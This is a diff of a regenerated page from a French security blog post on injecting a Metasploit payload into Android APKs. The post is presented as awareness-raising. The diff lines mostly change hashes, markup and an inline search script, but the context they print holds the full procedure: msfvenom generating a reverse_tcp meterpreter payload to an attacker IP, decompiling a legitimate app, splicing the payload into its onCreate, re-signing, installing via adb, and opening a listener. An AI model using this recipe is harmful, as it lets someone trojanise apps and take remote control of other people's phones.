@@ -245,7 +245,7 @@ mkdir ~/Dev/Android cd $_ wget https://bitbucket.org/iBotPeaches/apktool/downloa
 
 
 
-<link rel="stylesheet" href="https://leandeep.com/main.min.97cff9b820063eed1f719963e199e8907ee6d7c657c2f77cb00a044a7f22ea5a.css">
+<link rel="stylesheet" href="https://leandeep.com/main.min.2516edd1014c71ff667bbc5abfd506af171a02538f9f15382fff1b836b3078c8.css">
 
 
 
@@ -262,8 +262,8 @@ mkdir ~/Dev/Android cd $_ wget https://bitbucket.org/iBotPeaches/apktool/downloa
 <meta itemprop="name" content="Comprendre les failles de certains APKs Android (Payload injection avec Metasploit)">
 <meta itemprop="description" content="Introduction L&rsquo;objectif de cet article est de sensibiliser à la sécurité sur Android. Ce n&rsquo;est pas très compliqué d&rsquo;injecter des virus (très) néfastes dans des APKs disponibles sur internet. Surtout n&rsquo;installez pas des APKs qui ne proviennent pas des Stores Officiels d&rsquo;Apple ou Google sans savoir ce que vous faites.
  Installation sur Kali apktool
-mkdir ~/Dev/Android cd $_ wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.4.1.jar mv apktool_*.jar apktool.jar wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool mv * /usr/local/bin chmod &#43;x /usr/local/bin/apktool."><meta itemprop="datePublished" content="2020-11-13T16:49:00&#43;02:00" />
-<meta itemprop="dateModified" content="2020-11-13T16:49:00&#43;02:00" />
+mkdir ~/Dev/Android cd $_ wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.4.1.jar mv apktool_*.jar apktool.jar wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool mv * /usr/local/bin chmod &#43;x /usr/local/bin/apktool."><meta itemprop="datePublished" content="2020-11-13T16:49:00+02:00" />
+<meta itemprop="dateModified" content="2020-11-13T16:49:00+02:00" />
 <meta itemprop="wordCount" content="404"><meta itemprop="image" content="https://leandeep.com"/>
 <meta itemprop="keywords" content="kali,android,Security,metasploit,apk," /><meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://leandeep.com"/>
@@ -352,7 +352,7 @@ mkdir ~/Dev/Android cd $_ wget https://bitbucket.org/iBotPeaches/apktool/downloa
 <br/>
 <h2 id="installation-sur-kali">Installation sur Kali</h2>
 <p><strong>apktool</strong></p>
-<pre><code>mkdir ~/Dev/Android
+<pre tabindex="0"><code>mkdir ~/Dev/Android
 cd $_
 wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.4.1.jar
 mv apktool_*.jar apktool.jar
@@ -362,10 +362,10 @@ chmod +x /usr/local/bin/apktool.jar
 chmod +x /usr/local/bin/apktool
 </code></pre><br/>
 <p><strong>zipalign</strong></p>
-<pre><code>apt install zipalign
+<pre tabindex="0"><code>apt install zipalign
 </code></pre><br/>
 <p><strong>jarsigner</strong></p>
-<pre><code>apt install openjdk-14-jdk-headless
+<pre tabindex="0"><code>apt install openjdk-14-jdk-headless
 </code></pre><br/>
 <h2 id="génération-et-injection-du-payload-et-signature-de-lapk">Génération et injection du Payload et signature de l&rsquo;APK</h2>
 <p><strong>Download apk de test</strong></p>
@@ -375,7 +375,7 @@ chmod +x /usr/local/bin/apktool
 <p>Récupérer l&rsquo;IP de la machine qui exploitera la vulnérabilité
 ifconfig</p>
 <p>Configurer et générer le payload qui sera injecté dans l&rsquo;APK</p>
-<pre><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.17 LPORT=443 M&gt; ~/Dev/Android/payload.apk
+<pre tabindex="0"><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.17 LPORT=443 M&gt; ~/Dev/Android/payload.apk
 </code></pre><blockquote>
 <p>Vocabulaire Metasploit:</p>
 <ul>
@@ -387,38 +387,38 @@ ifconfig</p>
 </blockquote>
 <br/>
 <p><strong>Desassembler les APKs</strong></p>
-<pre><code>apktool d payload.apk
+<pre tabindex="0"><code>apktool d payload.apk
 apktool d mon_apk_avec_virus.apk
 </code></pre><br/>
 <p><strong>Ajouter le payload à l&rsquo;APK</strong></p>
-<pre><code>cp -R payload/smali/com/metasploit mon_apk_avec_virus/smali/com/
+<pre tabindex="0"><code>cp -R payload/smali/com/metasploit mon_apk_avec_virus/smali/com/
 </code></pre><br/>
 <p><strong>Ajouter la commande permettant de lancer le payload lors de l&rsquo;appel à la fonction <code>onCreate</code></strong></p>
 <p>En d&rsquo;autres termes, injecter le main activity du payload dans l&rsquo;APK après l&rsquo;appel du onCreate.</p>
 <p>Ligne suivante à ajouter dans le fichier <code>mon_apk_avec_virus/smali/com/company_name/mon_apk_avec_virus/SplashScreen.smali</code></p>
-<pre><code>invoke-static {p0}, Lcom/metasploit/stage/Payload;-&gt;start(Landroid/content/Context;)V
+<pre tabindex="0"><code>invoke-static {p0}, Lcom/metasploit/stage/Payload;-&gt;start(Landroid/content/Context;)V
 </code></pre><br/>
 <p><strong>Ajouter les permissions à l&rsquo;APK virus</strong></p>
 <p>Copier toutes les permissions identifiées par les lignes XML <code>&lt;uses-permission...</code> du fichier <code>payload/AndroidManifest.xml</code> dans <code>mon_apk_avec_virus/AndroidManifest.xml</code>.</p>
 <br/>
 <p><strong>Générer son propre certificat</strong></p>
-<pre><code>keytool -genkey -V -keystore /root/Dev/Android/key.keystore -alias education_purpose -keyalg RSA -keysize 2048 -validity 1000
+<pre tabindex="0"><code>keytool -genkey -V -keystore /root/Dev/Android/key.keystore -alias education_purpose -keyalg RSA -keysize 2048 -validity 1000
 </code></pre><br/>
 <p><strong>Signer son nouveau APK</strong></p>
-<pre><code>jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore /root/Dev/Android/key.keystore ./mon_apk_avec_virus_signed.apk education_purpose
+<pre tabindex="0"><code>jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore /root/Dev/Android/key.keystore ./mon_apk_avec_virus_signed.apk education_purpose
 </code></pre><br/>
 <p><strong>Zipalign</strong></p>
-<pre><code>zipalign -v 4 ./mon_apk_avec_virus_signed.apk mon_apk_avec_virus.apk
+<pre tabindex="0"><code>zipalign -v 4 ./mon_apk_avec_virus_signed.apk mon_apk_avec_virus.apk
 </code></pre><br/>
 <h2 id="installation-sur-device-cible">Installation sur device cible</h2>
 <blockquote>
 <p>Vérifier comment installer un apk sans qu&rsquo;Android soit en mode developer.</p>
 </blockquote>
-<pre><code>adb devices
+<pre tabindex="0"><code>adb devices
 adb install -r mon_apk_avec_virus.apk
 </code></pre><br/>
 <h2 id="exploitation">Exploitation</h2>
-<pre><code>msfconsole
+<pre tabindex="0"><code>msfconsole
 use exploit/multi/handler
 set payload android/meterpreter/reverse_tcp
 set lport 443
@@ -457,7 +457,7 @@ help
 
             <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>404 Mots</p>
 
-            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>13 Nov. 2020</p>
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>13 nov.. 2020</p>
         </div>
 
         
@@ -514,119 +514,6 @@ help
 </footer>
 
 
-<script>
-
-    class App extends React.Component {
-        constructor(options) {
-            console.log("data")
-            console.log(options.data)
-            super();
-            this.state = {
-                data: options.data,
-
-                appName: 'Search Bar (Algolia replacement under dev with React)',
-                list: undefined
-            };
-
-        }
-        searchData(e) {
-            var queryData = [];
-            if (e.target.value != '') {
-                this.state.data.forEach(function (person) {
-
-                    if (person.toLowerCase().indexOf(e.target.value) != -1) {
-                        if (queryData.length < 10) {
-                            queryData.push(person);
-                        }
-                    }
-                });
-            }
-            this.setState({ list: queryData });
-        }
-        render() {
-            return  (
-                React.createElement("div", null,  
-                    React.createElement(Header, { name: this.state.appName }),  
-                    React.createElement(SearchBar, { search: this.searchData.bind(this) }),
-                    this.state.list ?  React.createElement(SearchResult, { data: this.state.list }) : null));
-
-
-        }
-    }
-
-
-    class Header extends React.Component {
-        render() {
-            return  (
-                React.createElement("div", null,  
-                    React.createElement("h1", null, this.props.name)));
-
-
-        }
-    }
-
-
-    class SearchBar extends React.Component {
-        render() {
-            return  (
-                React.createElement("div", null,  
-                    React.createElement("input", { onChange: this.props.search, placeholder: "Search Pokemon" })));
-
-
-        }
-    }
-
-
-    class SearchResult extends React.Component {
-
-        render() {
-            return  (
-                React.createElement("div", null,  
-                    React.createElement("ul", null,
-                        this.props.data.map(function (value) {
-                            return  React.createElement(Item, { key: value, val: value });
-                        }))));
-
-
-
-
-        }
-    }
-
-
-
-    class Item extends React.Component {
-        render() {
-            return  (
-                React.createElement("li", null,
-                    this.props.val));
-
-
-        }
-    }
-
-
-    navigator.serviceWorker.addEventListener('message', event => {
-        console.log(event.data.msg, event.data.url, event.data.files);
-        ReactDOM.render(  React.createElement(App, { "data": ["Bulbasaur", "Ivysaur", "Venusaur", "Charmander", "Charmeleon", "Charizard", "Squirtle", "Wartortle", "Blastoise", "Caterpie", "Metapod", "Butterfree", "Weedle", "Kakuna", "Beedrill", "Pidgey", "Pidgeotto", "Pidgeot", "Rattata", "Raticate", "Spearow", "Fearow", "Ekans", "Arbok", "Pikachu", "Raichu", "Sandshrew", "Sandslash", "Nidoran♀", "Nidorina", "Nidoqueen", "Nidoran♂", "Nidorino", "Nidoking", "Clefairy", "Clefable", "Vulpix", "Ninetales", "Jigglypuff", "Wigglytuff", "Zubat", "Golbat", "Oddish", "Gloom", "Vileplume", "Paras", "Parasect", "Venonat", "Venomoth", "Diglett", "Dugtrio", "Meowth", "Persian", "Psyduck", "Golduck", "Mankey", "Primeape", "Growlithe", "Arcanine", "Poliwag", "Poliwhirl", "Poliwrath", "Abra", "Kadabra", "Alakazam", "Machop", "Machoke", "Machamp", "Bellsprout", "Weepinbell", "Victreebel", "Tentacool", "Tentacruel", "Geodude", "Graveler", "Golem", "Ponyta", "Rapidash", "Slowpoke", "Slowbro", "Magnemite", "Magneton", "Farfetch'd", "Doduo", "Dodrio", "Seel", "Dewgong", "Grimer", "Muk", "Shellder", "Cloyster", "Gastly", "Haunter", "Gengar", "Onix", "Drowzee", "Hypno", "Krabby", "Kingler", "Voltorb", "Electrode", "Exeggcute", "Exeggutor", "Cubone", "Marowak", "Hitmonlee", "Hitmonchan", "Lickitung", "Koffing", "Weezing", "Rhyhorn", "Rhydon", "Chansey", "Tangela", "Kangaskhan", "Horsea", "Seadra", "Goldeen", "Seaking", "Staryu", "Starmie", "Mr. Mime", "Scyther", "Jynx", "Electabuzz", "Magmar", "Pinsir", "Tauros", "Magikarp", "Gyarados", "Lapras", "Ditto", "Eevee", "Vaporeon", "Jolteon", "Flareon", "Porygon", "Omanyte", "Omastar", "Kabuto", "Kabutops", "Aerodactyl", "Snorlax", "Articuno", "Zapdos", "Moltres", "Dratini", "Dragonair", "Dragonite", "Mewtwo", "Mew"] }), document.getElementById('app'));
-    });
-    navigator.serviceWorker.register('/service-worker.js', {
-        scope: '.'
-    }).then(function (registration) {
-        console.log('The service worker has been registered ', registration);
-    });
-    
-
-    
-    setTimeout(function () {
-        console.log("unregister sws")
-        navigator.serviceWorker.getRegistrations().then(function (registrations) { for (let registration of registrations) { registration.unregister(); } });
-    }, 10000);
-
-
-
-
-</script>
             
         </div>
 
@@ -635,7 +522,7 @@ help
 
 
 
-<script type="text/javascript" src="https://leandeep.com/bundle.min.4c4018abe212b17439e8419b064bd828529395ff8df5349aa438112be0cc961ff0ce0b0ed9b6928981ad1ac33392249f24521da889270304f8978b15643c182c.js" integrity="sha512-TEAYq&#43;ISsXQ56EGbBkvYKFKTlf&#43;N9TSapDgRK&#43;DMlh/wzgsO2baSiYGtGsMzkiSfJFIdqIknAwT4l4sVZDwYLA=="></script>
+<script type="text/javascript" src="https://leandeep.com/bundle.min.5fb899bbe79feaa4c25d3b625cdf8714b7e904c3377458df39f9a29dc271fe25b5fedd8f8b2e2d9f1c1113688203f2d727cede28a05cf1a0a61ab76cc8a929d1.js" integrity="sha512-X7iZu&#43;ef6qTCXTtiXN&#43;HFLfpBMM3dFjfOfmincJx/iW1/t2Piy4tnxwRE2iCA/LXJ87eKKBc8aCmGrdsyKkp0Q=="></script>
 
 
 
